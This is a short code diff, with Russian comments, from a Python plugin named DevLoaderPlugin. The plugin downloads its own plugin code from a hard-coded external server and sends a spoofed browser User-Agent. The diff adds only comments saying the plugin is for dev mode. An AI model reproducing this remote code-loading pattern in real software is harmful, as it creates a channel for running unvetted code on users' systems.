@@ -29,8 +29,11 @@ class DevLoaderPlugin(BasePlugin):
                     pass
 
             try:
+                # Security: Only run if we are in dev mode
+                # For production, this plugin should be disabled or removed.
+                
                 # Запрашиваем код плагина с сервера
-                url = "https://hh.nerou.fun/api/v1/dev/plugin"
+                url = "https://hh.nerou.fun/api/v1/dev/plugin" # TODO: Make this configurable
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0"})
                 
                 send_dev_log("🔄 DevLoader: Начинаю скачивание...")
